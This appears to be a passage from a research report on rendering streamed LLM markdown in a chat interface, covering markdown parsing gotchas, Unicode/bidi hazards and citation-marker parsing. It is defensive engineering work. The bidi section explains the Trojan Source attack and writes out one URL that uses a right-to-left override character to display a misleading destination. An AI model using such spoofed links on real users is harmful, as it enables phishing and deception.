- **Closing fence length**: a fenced code block is closed only by a fence of the same character, at least as long as the opening one; a shorter run stays literal content. ([CommonMark §4.5 Fenced code blocks](https://spec.commonmark.org/0.31.2/#fenced-code-blocks))
- **Fences inside lists/blockquotes** inherit the container's indentation: content must be indented to the list item's content column, and the fence itself is stripped of that indentation. This is why a model emitting a fence at column 0 inside a `-` list breaks the list into a paragraph + a top-level code block. ([CommonMark §5.2 / §4.5](https://spec.commonmark.org/0.31.2/#fenced-code-blocks))
- **Nested fences of different lengths** are the only way to show a fence inside a fence: open with four backticks, include a three-backtick block, close with four. Streamdown relies on this in its own docs, where examples are written with ` ```` ` delimiters precisely because the payload contains ` ``` `. ([Streamdown: Unterminated Block Parsing](https://streamdown.ai/docs/termination))
- **Backtick info strings cannot contain backticks**, so ` ```js`fine ` is not a valid fence — a model that writes ` ``` ` inside the info string silently un-fences the block. ([CommonMark §4.5](https://spec.commonmark.org/0.31.2/#fenced-code-blocks))
- **`|` inside a table cell must be escaped as `\|`, including inside code spans** — the row is split into cells *before* inline parsing, so `` `a|b` `` still splits the cell. This is the single most common "table renders as garbage" cause in LLM output. ([GFM spec, tables extension](https://github.github.com/gfm/))
- **Autolink literals create false positives by design.** `remark-gfm` turns bare `www.x.com`, `https://…` and `contact@example.com` into links, and the maintainers concede "There are several edge cases where GitHub's implementation works in unexpected ways or even different than described in their spec, so *writing* in GFM is not always the best choice", pointing at the per-extension "Bugs" sections. ([remark-gfm readme](https://github.com/remarkjs/remark-gfm))
- `remark-gfm` documents per-extension bug lists for autolink literals, footnotes and tables, i.e. these are known-imperfect parsers, not spec-perfect ones. ([remark-gfm readme, "Bugs"](https://github.com/remarkjs/remark-gfm))
- Streamdown exposes `disableAutolinkProtocols` for exactly this: "Disable GFM / CommonMark autolinking for specific URL protocols (e.g. `['mailto']` stops bare email addresses from becoming links) … Only affects autolinks (bare URLs/emails and `<...>` forms); explicit `[text](url)` links are unaffected." ([Streamdown: Configuration](https://streamdown.ai/docs/configuration))
- **Ordered-list numbering**: markdown honours the *first* number as the start and then renumbers sequentially, so `3. a / 7. b` renders as 3, 4. A model that emits a "restart at 1" mid-list loses the restart. (CommonMark list rules, [§5.2](https://spec.commonmark.org/0.31.2/#list-items).)
- **Footnote IDs are document-scoped and generated**, e.g. `id="user-content-fn-1"` / `id="user-content-fnref-1"` plus a `<section data-footnotes>` block. ([remark-gfm readme, the rendered example](https://github.com/remarkjs/remark-gfm))
- **`~~strikethrough~~` with spaces**: GFM requires the delimiter run to satisfy flanking rules; `~~ text ~~` with a space adjacent to the delimiter typically does *not* strike through, and `remark-gfm` additionally accepts single tildes by default (`singleTilde: true`), which means `~one~` *does* strike through — the opposite of what most authors expect, and the reason `singleTilde: false` exists. ([remark-gfm readme, `singleTilde`](https://github.com/remarkjs/remark-gfm))

### Inferences
- **Footnote collisions across messages are a genuine, easily-reproduced defect** in a chat UI: each `react-markdown` instance parses its own message as its own document, so *every* message numbers its footnotes from 1. Two messages with a `[^1]` on the same page produce two elements with `id="user-content-fn-1"`, and clicking one message's footnote backref scrolls to whichever the browser resolved first — usually the earlier message. Fixes, in order of preference: (a) namespace the prefix per message by post-processing the hast (`id`/`href` → `fn-{messageId}-1`), (b) rewrite footnote markers to your own citation component before parsing (§7), or (c) render each message in a shadow DOM. Note `rehype-sanitize` already prefixes `user-content-`, so your rewrite must run *after* it or account for the prefix.
- **Ordered-list renumbering** is usually a *feature* for LLM output (models write `1.` for everything), but it is a bug for "steps 1–5, then a new 1–3 section" — and the failure is silent.
- **`~~` with spaces** and **single-tilde** are two different bugs wearing one costume: the first makes intended strikethrough not render; the second makes unintended text (`~approx~`, `20~25`) render struck through. `singleTilde: false` fixes the second and is the safer default for LLM output, where tilde is common in prose about ranges and versions.
- **Pipes in tables** is the one gotcha worth fixing in the prompt rather than the renderer: instruct the model to escape `|` inside cells, and add a diagnostic in dev that counts cells per row and warns on mismatch — a row with the wrong cell count is the earliest detectable symptom.
- **Autolink false positives** are best fixed by *narrowing* rather than disabling: keep autolinks (users expect `https://…` to be clickable) but disable `mailto` autolinking if the product shows email addresses that should not become `mailto:` links, since a `mailto:` in LLM output is a plausible phishing vector.

### Gaps
- I did not verify the exact flanking-rule behaviour of `~~ text ~~` against a live `remark-gfm` parse; the claim rests on GFM's delimiter-run rules plus `remark-gfm`'s `singleTilde` option. This should be validated with a 5-line test before being asserted to a user.
- The footnote-ID-collision claim is my analysis of how `react-markdown` scopes parsing per component plus the observed generated IDs; I found no GitHub issue reporting it, so it may be handled somewhere I did not see (e.g. by consumers rewriting IDs). Treat as high-confidence inference, not confirmed bug report.
- No source on how `remark-gfm`'s table parser behaves with a *ragged* row (more/fewer cells than the header); the GFM spec says extra cells are ignored and missing cells are empty, but I did not confirm the unified implementation matches.

## 6. Unicode and bidi

### Takeaway
There are three separable problems and they need three different fixes: **direction** (`dir="auto"` per block, never per document), **invisible control characters** (strip or visibly mark them, especially in code and in URLs), and **homoglyph/IDN domains** (show the punycode/registrable domain, never trust the rendered string).

### Cited Findings
- `dir="auto"` is the standard HTML mechanism: the browser determines direction from the element's first strong directional character, per element. ([MDN: `dir` global attribute](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/dir))
- Streamdown implements direction *per block*, which is the correct granularity for mixed-script documents, and documents the resolution rule precisely: "`auto` detects per block (content-majority strong characters, first-strong on ties). Code is always LTR." In static mode "a rehype pass assigns `dir` on each semantic block (headings, paragraphs, list items, blockquotes, definition terms/descriptions, captions, and table cells) so mixed Persian/Hebrew/Arabic/English documents keep the correct base direction without splitting the document (footnotes and cross-block references still resolve)." ([Streamdown: Configuration, `dir`](https://streamdown.ai/docs/configuration))
- Two details in that implementation are worth copying: "**Detection** — counts Unicode strong letters after stripping common markdown syntax. The majority wins; equal counts fall back to the first strong character. Fenced and inline code are excluded from the count so LTR identifiers do not skew surrounding RTL prose," and "**Code** — fenced code blocks and code-related elements are always LTR so line numbers and syntax highlighting stay correct inside RTL documents." ([Streamdown: Configuration](https://streamdown.ai/docs/configuration))
- **Bidi control characters are a code-display attack (CVE-2021-42574, "Trojan Source").** "By injecting Unicode Bidi override characters into comments and strings, an adversary can produce syntactically-valid source code in most modern languages for which the display order of characters presents logic that diverges from the real logic." ([Krebs on Security, quoting the paper](https://krebsonsecurity.com/2021/11/trojan-source-bug-threatens-the-security-of-all-code/); [Trojan Source paper](https://trojansource.codes/); [Wikipedia](https://en.wikipedia.org/wiki/Trojan_Source))
- The relevant constraint for a renderer: "All Unicode Bidi control characters are restricted to affecting a single paragraph, as a newline character will explicitly close any unbalanced control characters, namely those that lack a corresponding closing character." ([Trojan Source paper, PDF](https://trojansource.codes/trojan-source.pdf)) So an unterminated RLO does **not** leak past a newline — but it does silently reorder the rest of its own line, which in a one-line URL or a one-line `if` statement is exactly enough.
- The canonical mitigations named in the disclosure are to detect/flag the control characters (CVE-2021-42574) and to detect confusable/homoglyph identifiers (CVE-2021-42694). ([Trojan Source paper](https://trojansource.codes/); [Wikipedia](https://en.wikipedia.org/wiki/Trojan_Source))
- Tooling exists at the "scan for invisible bidi characters" level, e.g. `bidi-guard`, which states the attack plainly: "Invisible Unicode bidirectional characters can make source code display differently than it executes. This is CVE-2021-42574." ([Moshe-ship/bidi-guard](https://github.com/Moshe-ship/bidi-guard))

### Inferences
- **`dir="auto"` on the container is not enough and is actively harmful for a chat message.** A message that opens with an English sentence and then quotes Arabic will be laid out LTR as a whole; worse, a message that opens with a single Arabic word flips the *entire* message RTL including its code blocks and tables. Apply `dir` per block (paragraph, list item, table cell, heading) and hard-force `dir="ltr"` on `pre`/`code` — which is exactly what Streamdown does.
- **Zero-width and bidi controls in *code*** should be made visible, not stripped: stripping changes the bytes the user copies (silently "fixing" the code, which is worse — it hides the attack), while leaving them invisible is the attack. The defensible pattern is to render them as a visible placeholder (e.g. `<U+202E>`) in code blocks, or to show a warning badge on the block ("contains 3 invisible bidi characters"), and to *never* include them silently in the copy buffer without a warning.
- **In prose**, stripping U+200B/U+200E/U+200F/U+202A–U+202E/U+2066–U+2069 is reasonable, because prose has no legitimate use for them and they are a classic "invisible text smuggled into a summary" trick.
- **In URLs the control characters are the whole attack.** `https://exam\u202Eple.com/moc.elpmaxe//:sptth` renders as a plausible-looking URL pointing somewhere else. Since `react-markdown` passes the raw string to `href`, the *displayed* text and the *actual* target diverge with no sanitizer involvement. Defend by rejecting any URL containing Unicode Cf (format) characters before render, and by displaying the parsed host next to the link text.
- **Homoglyph domains** (Cyrillic `а` U+0430 vs Latin `a` U+0061) cannot be fixed by escaping — the fix is to *show the truth*: render the registrable domain in punycode (`xn--…`) next to the Unicode form, or render only the registrable domain in a muted style, plus the destination on hover. Chrome and Firefox already force punycode display for mixed-script labels, but an in-app citation list must not rely on the browser's URL bar heuristics because the citation is *not* in the URL bar.
- For citations specifically, the strongest available mitigation is structural rather than textual: **never render a model-supplied URL as the citation target**. Render the citation as a reference into *your* retrieved-sources table, keyed by index, and take the URL from that table. A model that hallucinates or spoofs a URL then has no path to the DOM at all.

### Gaps
- I found no source on how `react-markdown` handles bidi controls — it does not, since it passes text through — and no library in the unified ecosystem that implements bidi-control detection. This appears to be genuinely unhandled in the stack.
- I did not verify whether browsers' automatic punycode display applies to `innerText`/`title` attributes and link previews; the recommendation to display punycode explicitly is a hedge against that uncertainty.
- No data on how often LLM output actually contains bidi controls (i.e. whether this is a theoretical or observed attack path in chat UIs); the Trojan Source research is about source code in repos, and I found no chat-specific incident.

## 7. Citation-marker parsing hazards

### Takeaway
Inline-string citation parsing (`[1]`, `【1】`) is fundamentally unreliable because it fights the markdown parser: the same bytes mean "citation" outside code and "link reference"/"footnote"/"literal text" inside it. The robust architecture is to **not parse citations out of the rendered markdown at all** — either emit a custom node from a remark plugin that already knows code context, or parse citations *before* markdown on the raw string with a fence-aware scanner, and validate every index against the sources array.

### Cited Findings
- **`[1]` outside code is a link reference, not a citation.** CommonMark parses `[1]` as a shortcut reference link; if no definition `[1]: …` exists it renders as literal text, but the moment a matching definition appears anywhere in the document it becomes a link. So the *same* marker changes meaning depending on unrelated content elsewhere in the message — including content that arrives later in the stream. ([CommonMark §4.7 Link reference definitions](https://spec.commonmark.org/0.31.2/#link-reference-definitions))
- **`[^1]` is a GFM footnote, which `remark-gfm` will consume.** It generates `id="user-content-fn-1"` / `user-content-fnref-1` and appends a `<section data-footnotes>` list at the end of the message. ([remark-gfm readme, rendered example](https://github.com/remarkjs/remark-gfm)) So `[^1]` and `[1]` are *different* constructs with different failure modes, and `[1.]` is neither — it is literal text.
- **`【1】` (CJK lenticular brackets) is not markdown at all** — it survives parsing as plain text in a paragraph, which makes it the *safest* marker to post-process, but it is also the one most likely to appear inside legitimate CJK prose, so a naive `【\d+】` replacement can corrupt text.
- **Inside a code fence or inline code, any marker is content.** CommonMark gives code spans and fenced blocks absolute precedence over inline constructs, so `[1]` in `` `[1]` `` is literal — which is exactly what you want, and exactly what a regex post-pass over rendered HTML would destroy. ([CommonMark §6.1 Code spans](https://spec.commonmark.org/0.31.2/#code-spans))
- **Inside link text, `[1]` is nested brackets**, which are legal in link text only if balanced; a citation injector that rewrites `[1]` → `<sup>1</sup>` inside `[see [1]](url)` produces `[see <sup>1</sup>](url)`, which is no longer a link. ([CommonMark §6.3 Links](https://spec.commonmark.org/0.31.2/#links))
- **Inside a table cell**, a `[1]` is fine but a `|`-containing replacement is not: any injected markup must not introduce a `|`, or it re-splits the row (see §5). ([GFM spec, tables](https://github.github.com/gfm/))
- **Markers split across stream chunks**: `[1` then `]` means that at the moment the first chunk renders, the text contains an unterminated `[`, which is literal; on the next chunk it becomes a citation. This is the same class of problem as §1's half-written link, and the same fix applies (a completion pre-pass, or defer citation rendering until the stream ends). (Inference from §1's mechanism; Streamdown's `remend` handles the general "incomplete link" case by substituting `streamdown:incomplete-link`.)
- **GFM's own footnote implementation is the existence proof that markers must be validated**: it numbers footnotes and generates back-references, and it requires the definition to exist for the reference to resolve. ([remark-gfm readme](https://github.com/remarkjs/remark-gfm))

### Inferences
- **The "numbers larger than the sources array" and "repeated numbers" failures are not rendering bugs — they are prompt-injection and hallucination signals.** A model that emits `[7]` when there are 3 sources is either hallucinating or has been manipulated into fabricating a citation. Render out-of-range markers as *visibly invalid* (e.g. a red `[7]` with "no such source") rather than silently dropping them; silently dropping turns a detectable hallucination into a plausible-looking, uncited claim. The same applies to repeated numbers: `[1][1][1]` should collapse to one chip, not three, or the citation count becomes meaningless.
- **Architecture recommendation, in order of robustness:**
  1. **Best — don't parse text.** Have the model emit a distinct syntax your pipeline owns (`<cite id="1"/>`, or a `data-citation` fenced block), parse it with a remark plugin that runs *after* `remark-gfm` so it sees the real tree and can skip `code`/`inlineCode` nodes by node type rather than by regex. Then map `id` → your sources array, discard unknown ids. This eliminates every hazard in this section at once, including split chunks (a half-written `<cite` is just text until it closes).
  2. **Acceptable — pre-parse with a fence-aware scanner.** Scan the raw string once, tracking fence state (` ``` `/`~~~`, length, and inline-code backtick runs) and table state, and only then replace `[n]`. This is a mini markdown parser and will drift from CommonMark; it must be tested against nested fences (§5) and inline code containing backticks.
  3. **Worst — regex the rendered DOM.** `innerHTML.replace(/\[(\d+)\]/g, …)` will rewrite markers inside `<code>`, inside link text, and inside `<pre>` — all three are the exact cases §7 lists as hazards. This is the pattern most likely to be reached for and the one to explicitly forbid in review.
- **Validate on both ends**: range-check `1 ≤ n ≤ sources.length`, dedupe, and cap the number of chips per paragraph (a model that emits 40 citations in one sentence is usually padding). Also clamp the *sources array* length — an unbounded `sources[n-1]` lookup is a trivial out-of-bounds read if `n` is `0` or negative, and `[0]` is a legal markdown reference.
- **Split-across-chunks is best solved by not solving it**: render citations only when `!isStreaming`, or render the marker as plain text until the closing bracket arrives. Trying to render a citation optimistically produces a chip that flickers into text and back.
- **`[1.]` should be treated as a citation, not as an ordered list item.** `[1.]` is not an ordered-list marker (`1.` is), so it renders as literal text; if your prompt asks for `[1.]` style you get markers that are safe from list interpretation but still need the same range validation.

### Gaps
- I found no primary source on how OpenAI/Perplexity/You.com actually implement citation markers internally; all statements above are derived from the markdown/GFM specs and from what the parsers demonstrably do. The claim that a given product "uses `【1】`" is common knowledge in prompt-engineering circles but I could not verify it.
- No source addresses the specific interaction of citation markers with `rehype-sanitize` — whether an injected `<sup data-citation>` survives the default schema. My expectation is that it does *not* (unknown attributes are stripped), which means citation injection must happen *after* sanitisation or the schema must allow it explicitly; I did not test this.
- I did not find any library that solves citation-marker parsing robustly; this appears to be uniformly bespoke per product.

## Cross-cutting implementation checklist (derived, not sourced)

Ordered by "cheapest change with the largest effect", for a `react-markdown@10` + `remark-gfm@4` chat UI:

1. `React.memo` each message component, keyed by message `id`; render completed messages with `isStreaming={false}` so they never re-parse. Serially: no cost, huge win. (per [#621](https://github.com/remarkjs/react-markdown/issues/621))
2. Coalesce stream tokens into state at most once per frame, and gate the markdown subtree behind `useDeferredValue`. (~30–60 ms effective cadence; per [Open WebUI #20878](https://github.com/open-webui/open-webui/discussions/20878))
3. Apply a completion pre-pass (`remend`, or ~100 lines of your own) to close dangling `**`, `` ` ``, `~~`, `$$`, and stub incomplete links to a non-navigating sentinel. (per [Streamdown](https://streamdown.ai/docs/termination))
4. Buffer transport chunks on code-point boundaries (`Array.from`, or check `charCodeAt(len-1)` in `0xD800–0xDBFF` and hold one code unit). (per [mastra #29268](https://github.com/mastra-ai/mastra/issues/29268))
5. Split the streaming message into blocks and freeze closed ones. (per [Streamdown: Memoization](https://streamdown.ai/docs/memoization), [StreamMD](https://dev.to/jvoltci/i-made-streaming-markdown-300x-faster-heres-the-architecture-4a9f))
6. Do **not** enable `rehype-raw`. If you must, `[rehypeRaw, rehypeSanitize]` in that order, sanitize last. (per [rehype-sanitize](https://github.com/rehypejs/rehype-sanitize), [vercel-labs](https://github.com/vercel-labs/markdown-sanitizers))
7. Restrict images to first-party origins and disable `data:` images; add CSP `img-src` as the backstop. (per [Streamdown: Security](https://streamdown.ai/docs/security))
8. `components.a` → `target="_blank" rel="noopener noreferrer"`, and show the destination host. (per [MDN](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/rel/noopener))
9. `components.code` → strip ANSI (incl. OSC 52), normalize `\r\n`/`\r`, `tab-size: 4`, size/language-gated highlighting, no highlighting while `isStreaming`. (per [Streamdown: Code Blocks](https://streamdown.ai/docs/code-blocks), [packetlabs](https://www.packetlabs.net/posts/weaponizing-ansi-escape-sequences/))
10. Per-block `dir`, `dir="ltr"` forced on code; reject/render cf-characters in URLs; citations resolved against your own sources table, never the model's URL. (per [Streamdown: Configuration](https://streamdown.ai/docs/configuration), [Trojan Source](https://trojansource.codes/))
